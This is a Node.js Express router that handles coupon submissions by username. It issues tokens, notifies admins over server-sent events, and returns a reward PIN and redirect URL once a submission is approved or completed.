const express = require('express');
const crypto = require('crypto');
const db = require('../db');
const sse = require('../sse');

const router = express.Router();

function generateToken() {
  return 'usr_' + crypto.randomBytes(8).toString('hex');
}

// Submit username & coupon (Page 2 submission)
router.post('/submissions', (req, res) => {
  const { username, coupon } = req.body;
  if (!username || !coupon) {
    return res.status(400).json({ error: 'Username and coupon are required' });
  }

  const token = generateToken();
  const submission = db.createSubmission(token, username.trim(), coupon.trim());

  sse.notifyAdmins({ type: 'new_submission', submission });

  res.json({ success: true, token });
});

// Get submission status
router.get('/submissions/:token/status', (req, res) => {
  const submission = db.getSubmissionByToken(req.params.token);
  if (!submission) {
    return res.status(404).json({ error: 'Submission not found' });
  }

  const response = {
    status: submission.status,
    username: submission.username
  };

  if (submission.status === 'approved' || submission.status === 'completed') {
    response.reward_pin = submission.reward_pin;
    response.redirect_url = db.getRedirectUrl();
  }

  res.json(response);
});

// SSE connection for user waiting page
router.get('/submissions/:token/events', (req, res) => {
  const token = req.params.token;
  const submission = db.getSubmissionByToken(token);
  if (!submission) {
    return res.status(404).end();
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  if (submission.status === 'approved' || submission.status === 'rejected') {
    const payload = {
      status: submission.status,
      reward_pin: submission.reward_pin,
      redirect_url: db.getRedirectUrl()
    };
    res.write(`data: ${JSON.stringify(payload)}\n\n`);
    return;
  }

  sse.subscribeUser(token, res);
});

// User clicks "Done" on page 3
router.post('/submissions/:token/complete', (req, res) => {
  const token = req.params.token;
  const submission = db.getSubmissionByToken(token);
  if (!submission) {
    return res.status(404).json({ error: 'Submission not found' });
  }

  db.completeSubmission(token);
  sse.notifyAdmins({ type: 'status_updated', token, status: 'completed' });

  res.json({
    success: true,
    redirect_url: db.getRedirectUrl()
  });
});

module.exports = router;
